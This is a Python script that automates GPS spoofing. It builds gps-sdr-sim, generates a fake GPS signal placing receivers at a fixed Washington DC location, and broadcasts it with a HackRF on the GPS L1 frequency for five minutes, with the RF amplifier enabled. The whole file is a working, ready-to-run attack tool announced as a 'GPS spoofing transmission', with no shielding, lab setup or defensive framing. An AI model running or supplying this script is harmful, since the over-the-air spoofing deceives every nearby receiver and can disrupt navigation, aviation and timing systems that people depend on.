import subprocess
import time
import signal
import os
from datetime import datetime

# Define constants
repo_url = "https://github.com/osqzss/gps-sdr-sim"
repo_dir = "gps-sdr-sim"
binary_name = "./gps-sdr-sim"
ephemeris_file = "brdc0480.25n"  # Ensure this exists in repo_dir
location = "38.8976633,-77.0365739,100"
duration_seconds = 300  # 5 minutes

try:
    # Clone the GPS-SDR-SIM repository if it doesn't exist
    if not os.path.isdir(repo_dir):
        print("📥 Cloning gps-sdr-sim repository...")
        subprocess.run(["git", "clone", repo_url], check=True)
    else:
        print("✅ gps-sdr-sim repository already exists.")

    # Compile gps-sdr-sim
    print("🛠️ Compiling gps-sdr-sim...")
    subprocess.run(["gcc", "gpssim.c", "-lm", "-O3", "-o", "gps-sdr-sim"], cwd=repo_dir, check=True)

    # Generate gpssim.bin
    print("🛰️ Generating gpssim.bin...")
    subprocess.run(
        [binary_name, "-b", "8", "-e", ephemeris_file, "-l", location],
        cwd=repo_dir,
        check=True
    )
    print("✅ gpssim.bin generated.")

    # Define HackRF transmit command
    transmit_command = [
        "hackrf_transfer",
        "-t", "gpssim.bin",
        "-f", "1575420000",
        "-s", "2600000",
        "-a", "1",
        "-x", "0"
    ]

    print("🚀 Starting GPS spoofing transmission for 5 minutes...")
    start_time = datetime.now()
    print(f"📅 Start time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    process = subprocess.Popen(transmit_command, cwd=repo_dir)

    time.sleep(duration_seconds)

    process.send_signal(signal.SIGINT)
    process.wait()

    end_time = datetime.now()
    print(f"📅 End time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("✅ Transmission stopped after 5 minutes.")

except subprocess.CalledProcessError as e:
    print(f"❌ Subprocess failed: {e}")
except FileNotFoundError as e:
    print(f"❌ File not found: {e}")
except KeyboardInterrupt:
    print("⛔ Interrupted by user. Terminating transmission...")
    if 'process' in locals() and process.poll() is None:
        process.terminate()
        process.wait()
except Exception as e:
    print(f"❌ Unexpected error: {e}")
